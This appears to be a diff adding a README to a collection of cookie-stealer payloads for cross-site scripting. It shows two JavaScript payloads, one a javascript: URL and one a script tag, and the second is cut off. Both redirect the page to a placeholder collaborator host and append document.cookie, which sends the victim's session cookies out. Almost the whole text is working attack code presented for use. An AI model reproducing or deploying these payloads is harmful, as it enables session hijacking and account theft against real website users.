@@ -1,3 +1,11 @@
+# CookieStealer-Payloads  
+
+>Cookie Stealer payloads using Javascript
+
+```Javascript
+JavaScript:document.location='https://COLLABORATOR.com?c='+document.cookie
+```  
+
 ```Javascript
 <script>
 document.location='https://Collaborator.com/?cookiestealer='+document.cookie;
